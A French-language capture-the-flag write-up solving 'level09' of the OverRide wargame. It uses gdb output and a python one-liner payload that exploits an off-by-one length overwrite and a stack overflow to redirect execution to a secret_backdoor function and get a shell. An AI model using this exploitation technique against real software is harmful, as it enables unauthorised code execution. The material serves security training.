# Level 09

```
    (python -c 'print "A" * 40 +"\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
```

## Soluce

En analysant le code source decompiler (avec Hex-Ray / Ida), on peu voir plusieur point interressant :

-   Dans la fonction **set_username**, la boucle copie l'input du user 40 octet apres la fin  buffer (140 -> 180 apres le debut du buffer), cependant la condition d'arret permet de copié 1 octt supplementaire donc le 181 eme caractere apres le buffer
-   Dans la fonction **set_msg**, les 180 premier octet de msg sont copier dans le buffer, en utilisant comme taille ce qui est stocker a buffer + 180 comme un int

On peu en conclure plusieurs chose :

-   Cela peu correspondre a une structure car toute les donnée sont aligner dans la memoire, ce qui est generalement le cas avec une stucture
-   On peu du coup overwrite les dernier octet de la variable qui est utilisé pour la taille du **strncpy** dans **set_msg**, ce qui va pottentiellement faire un **buffer Overflow**, on va nommer cette variable **len_cpy**

On va tester de overwrite avec du coup la valeur maximal que peu stocker un octet **ff** :

```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"') | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

Observons avec gdb ce qui est overwrite :

```
(gdb) run < <(python -c 'print "A" * 40 + "\xff"')
Starting program: /home/users/level09/level09 < <(python -c 'print "A" * 40 + "\xff"')
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) info r
rax            0xd      13
rbx            0x0      0
rcx            0x7ffff7b01f90   140737348902800
rdx            0x7ffff7dd5a90   140737351867024
rsi            0x7ffff7ff7000   140737354100736
rdi            0xffffffff       4294967295
rbp            0x0      0x0
rsp            0x7fffffffddc0   0x7fffffffddc0
r8             0x7ffff7ff7004   140737354100740
r9             0xc      12
r10            0xe      14
r11            0x246    582
r12            0x555555554790   93824992233360
r13            0x7fffffffdea0   140737488346784
r14            0x0      0
r15            0x0      0
rip            0x0      0
eflags         0x10246  [ PF ZF IF RF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0
```

Recuperont l'offset pour voir a partir de ou cela overwrite, et dans quelle registre :

```
    (gdb) run < <(python -c 'print "A" * 40 +"\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
    Starting program: /home/users/level09/level09 < <(python -c 'print "A" * 40 +"\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
    warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username
    >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
    >>: >: Msg sent!

    Program received signal SIGSEGV, Segmentation fault.
    0x0000555555554931 in handle_msg ()
    (gdb) info r
    rax            0xd      13
    rbx            0x0      0
    rcx            0x7ffff7b01f90   140737348902800
    rdx            0x7ffff7dd5a90   140737351867024
    rsi            0x7ffff7ff7000   140737354100736
    rdi            0xffffffff       4294967295
    rbp            0x6741356741346741       0x6741356741346741
    rsp            0x7fffffffddb8   0x7fffffffddb8
    r8             0x7ffff7ff7004   140737354100740
    r9             0xc      12
    r10            0x7fffffffd660   140737488344672
    r11            0x246    582
    r12            0x555555554790   93824992233360
    r13            0x7fffffffdea0   140737488346784
    r14            0x0      0
    r15            0x0      0
    rip            0x555555554931   0x555555554931 <handle_msg+113>
    eflags         0x10246  [ PF ZF IF RF ]
    cs             0x33     51
    ss             0x2b     43
    ds             0x0      0
    es             0x0      0
    fs             0x0      0
    gs             0x0      0
```

On voit que **rip** n'as pas ete overwrite, cependant on peu noter un quelque chose interessant on a overwrite **rbp** a l'offset 192, ce qui peu nous permettre du coup d'overwritte quasiment n'importe quoi dans la stack, dont l'adresse de retour normalement elle se situe a **rbp** + 8, verifions :

```
    (gdb) b set_msg
    Breakpoint 1 at 0x555555554936
    (gdb) run
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y

    Starting program: /home/users/level09/level09 < <(python -c 'print "A" * 40 +"\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"')
    warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
    --------------------------------------------
    |   ~Welcome to l33t-m$n ~    v1337        |
    --------------------------------------------
    >: Enter your username

    Breakpoint 1, 0x0000555555554936 in set_msg ()
    (gdb) info f
    Stack level 0, frame at 0x7fffffffdcf0:
    rip = 0x555555554936 in set_msg; saved rip 0x555555554924
    called by frame at 0x7fffffffddc0
    Arglist at 0x7fffffffdce0, args: 
    Locals at 0x7fffffffdce0, Previous frame's sp is 0x7fffffffdcf0
    Saved registers:
    rbp at 0x7fffffffdce0, rip at 0x7fffffffdce8
    (gdb) x/x $ebp + 8
    0xffffffffffffdce8:     Cannot access memory at address 0xffffffffffffdce8
```

Parfait cela colle bien, maintenant plus que a recuperer l'adresse de **secret_backdoor** :

```
(gdb) p &secret_backdoor 
$1 = (<text variable, no debug info> *) 0x55555555488c <secret_backdoor>
```

### Payload

**[Padding : 40]** + **[overwrite len_msg]** + **[retour a la ligne]** + **[Padding adresse de retour]** + **[Code Arbitraire]**

```
level09@OverRide:~$ (python -c 'print "A" * 40 +"\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
lol
sh: 1: lol: not found
^C
Segmentation fault (core dumped)
level09@OverRide:~$ (python -c 'print "A" * 40 +"\xff" + "\n" + "B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
```